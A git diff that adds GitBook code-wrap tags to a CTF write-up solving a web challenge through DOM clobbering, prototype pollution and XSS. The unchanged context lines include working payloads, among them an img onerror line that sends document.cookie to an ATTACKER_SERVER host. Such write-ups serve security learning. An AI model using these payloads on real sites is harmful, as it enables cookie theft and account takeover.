@@ -34,6 +34,7 @@ Trying some basic XSS payloads is fruitless but the source is included, so let's
 
 #### index.js
 
+{% code overflow="wrap" %}
 ```js
 import express from "express";
 import bodyParser from "body-parser";
@@ -120,9 +121,11 @@ app.listen(port, () => {
     console.log(`Example app listening on port ${port}`);
 });
 ```
+{% endcode %}
 
 #### sanes.ejs
 
+{% code overflow="wrap" %}
 ```html
 <!DOCTYPE html>
 <html lang="en">
@@ -194,6 +197,7 @@ app.listen(port, () => {
     </body>
 </html>
 ```
+{% endcode %}
 
 ## Attack Plan
 
@@ -203,14 +207,17 @@ Our ultimate goal is to steal the admin's cookie 🍪
 
 We can see from the code in `index.js`, they will access the challenge domain and set a cookie containing the flag. Next, they will visit our note.
 
+{% code overflow="wrap" %}
 ```js
 await page.goto("http://localhost:3000");
 await page.setCookie({ name: "flag", value: process.env.FLAG });
 await page.goto(`http://localhost:3000/${sane}`);
 ```
+{% endcode %}
 
 So how can we trigger the XSS? If we look at line 50 in `sane.ejs`, we'll see that a `sanitizer` will sanitize our payload _unless_ `debug.sanitize` is false.
 
+{% code overflow="wrap" %}
 ```js
 if (debug.sanitize) {
     document.getElementById("paste").setHTML(body, { sanitizer });
@@ -218,9 +225,11 @@ if (debug.sanitize) {
     document.getElementById("paste").innerHTML = body;
 }
 ```
+{% endcode %}
 
 This brings us onto the next problem; `sanitize` is set to `true` by default in the class declaration on line 20.
 
+{% code overflow="wrap" %}
 ```js
 class Debug {
     #sanitize;
@@ -233,12 +242,15 @@ class Debug {
     }
 }
 ```
+{% endcode %}
 
 The \[constant\] `debug` object is instantiated on line 38, where it is also set to `true`.
 
+{% code overflow="wrap" %}
 ```js
 const debug = Object.assign(new Debug(true), extension ?? { report: true });
 ```
+{% endcode %}
 
 According to this line of code, if `extension` is defined (not null) then a new `debug` object will be created which has properties from both the `Debug(true)` instance and the `extension` object.
 
@@ -248,6 +260,7 @@ So, if we could control `extension`, we could potentially use [Prototype Polluti
 
 We look through the code to find where extension is assigned, there's a function at line 31.
 
+{% code overflow="wrap" %}
 ```js
 async function loadBody() {
     let extension = null;
@@ -256,15 +269,18 @@ async function loadBody() {
         extension = await res.json();
     }
 ```
+{% endcode %}
 
 Extension is set to null! It then checks for `window.debug.extension` and if exists, makes a HTTP request to that URL and sets extension to contain the response, which is expected to be JSON data.
 
 If we try and submit some benign text and check with devtools (F12 🚔) , the console shows the following.
 
+{% code overflow="wrap" %}
 ```js
 >> window.debug
 <- undefined
 ```
+{% endcode %}
 
 This brings us on to our final (technically first) vulnerability; [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
 
@@ -272,11 +288,13 @@ This brings us on to our final (technically first) vulnerability; [DOM Clobberin
 
 We have a script on line 15 (right after the sanitizer instantiation)
 
+{% code overflow="wrap" %}
 ```js
 document
     .getElementById("title")
     .setHTML(decodeURIComponent(`<%- title %>`), { sanitizer });
 ```
+{% endcode %}
 
 It's calling `setHTML` on our input, so we can inject HTML. There is a sanitizer active (with [default configuration](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/sanitize)) but it only `"strips out XSS-relevant input by default"` so the [sanitized setHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML) leaves us a lot of room to accomplish our goal.
 
@@ -305,9 +323,11 @@ I thought; no worries, just like in that video writeup, we can manually enable S
 
 Once that was enabled, HTML injection worked! Submitting the following payload as the `title` and `paste` values, produced **bold** output 🔥
 
+{% code overflow="wrap" %}
 ```html
 <b>420</b>
 ```
+{% endcode %}
 
 Unfortunately, I got stuck again at the next step and switching to Chrome solved it (you might want to do the same, if you're having issues).
 
@@ -315,39 +335,51 @@ Unfortunately, I got stuck again at the next step and switching to Chrome solved
 
 We review some of the earlier documentation, or use this awesome [DOMC Payload Generator](https://domclob.xyz/domc_payload_generator)
 
+{% code overflow="wrap" %}
 ```txt
 target: debug.extension
 value: //ATTACKER_SERVER
 ```
+{% endcode %}
 
 We can try the various payloads and each time check the value of `window.debug.extension` in the console.
 
+{% code overflow="wrap" %}
 ```html
 <a id="debug"></a><a id="debug" name="extension" href="//ATTACKER_SERVER"></a>
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```js
 >> window.debug.extension.toString()
 <- 'https://attacker_server'
 ```
+{% endcode %}
 
 Perfect! So we know that
 
+{% code overflow="wrap" %}
 ```js
 fetch(window.debug?.extension.toString());
 ```
+{% endcode %}
 
 will actually be
 
+{% code overflow="wrap" %}
 ```js
 fetch("https://attacker_server");
 ```
+{% endcode %}
 
 Side note: The [official solution](https://gist.github.com/voxxal/fb69443f0a31bc6f2ddbce763d609935#sanity) from the challenge author used a different technique. By specifying the `data` value, they were able to assign the desired JSON object directly.
 
+{% code overflow="wrap" %}
 ```js
 <a id=debug><a id=debug name=extension href='data:;,{"report": true}'>
 ```
+{% endcode %}
 
 If, like me, you were using a `SimpleHTTPServer` with python, exposed via `ngrok` then you'll notice you didn't receive a request.
 
@@ -359,6 +391,7 @@ There's various ways we can add this header, e.g. launching `ngrok` with `--requ
 
 In this case, I used a `nodejs` app (exposed via `ngrok`).
 
+{% code overflow="wrap" %}
 ```js
 const http = require("http");
 
@@ -375,19 +408,23 @@ server.listen(port, () => {
     console.log(`Server listening on port ${port}`);
 });
 ```
+{% endcode %}
 
 Now, when we refresh the page, our server gets a hit! However, when we check the report, there is no longer a report link 🤔
 
 If we review the code again, the missing report link situation should be quite obvious.
 
+{% code overflow="wrap" %}
 ```js
 const debug = Object.assign(new Debug(true), extension ?? { report: true });
 ```
+{% endcode %}
 
 So, if extension exists, the `debug` object will be assigned it's properties (else, `report: true`). That has happened, but the JSON object sent by our server is currently `{}`.
 
 Therefore, the properties of `debug` simply mirror the `Debug` class, the `debug.report` condition returns false and the report link is never created.
 
+{% code overflow="wrap" %}
 ```js
 if (debug.report) {
     const reportLink = document.createElement("a");
@@ -399,18 +436,23 @@ if (debug.report) {
     document.body.appendChild(reportLink);
 }
 ```
+{% endcode %}
 
 Since we control the properties of extension, let's change the line in our server code to the following.
 
+{% code overflow="wrap" %}
 ```js
 res.end('{"report": true}');
 ```
+{% endcode %}
 
 Now, when we restart the server, our report link is generated! We add a simple XSS to the paste field (`<script>` won't work with `innerHTML` though, these tags only load when the page loads).
 
+{% code overflow="wrap" %}
 ```html
 <img src="x" onerror="alert(1)" />
 ```
+{% endcode %}
 
 The alert doesn't trigger, so let's move on to the next stage!
 
@@ -418,17 +460,21 @@ The alert doesn't trigger, so let's move on to the next stage!
 
 The idea here is to pollute `__proto__` with the desired `key:value` pairs so that every object will inherit them. Change the line to the following.
 
+{% code overflow="wrap" %}
 ```js
 res.end('{"__proto__": {"sanitize": false, "report": true}}');
 ```
+{% endcode %}
 
 When I check the debugger again, `sanitize` is still not false. I really thought this worked for me yesterday, using the same payloads 🤷‍♂️
 
 Regardless, the alert is popped! Since `sanitize` doesn't seem to matter, let's try without it.
 
+{% code overflow="wrap" %}
 ```js
 res.end('{"__proto__": {"report": true}}');
 ```
+{% endcode %}
 
 Yep, it works! I tried a few variations to disable the sanitizer but didn't get there.
 
@@ -442,17 +488,21 @@ OK, I guess I can't change it? 🤔 But.. if `debug.sanitize` is always true, wh
 
 edit: After speaking with the challenge creator and playing around with the challenge again, it turns out any form of prototype pollution is enough, e.g. sending an empty object will work just fine. Presumably this overwrites the existing object, making `sanitize` undefined so that the if condition doesn't trigger 🤷‍♂️
 
+{% code overflow="wrap" %}
 ```js
 res.end('{"__proto__": {}}');
 ```
+{% endcode %}
 
 ### Part 3: XSS
 
 You can probably find many payloads to extract the flag, but I went with this one.
 
+{% code overflow="wrap" %}
 ```js
 <img src=x onerror=document.location='http://ATTACKER_SERVER/?'+document.cookie;>
 ```
+{% endcode %}
 
 Upon loading, the page will try to display the image `x`. Since that's not a valid `img src`, it will trigger an error and execute some JS to redirect the victim to the attacker server (us) with their cookie attached as a GET parameter.
 
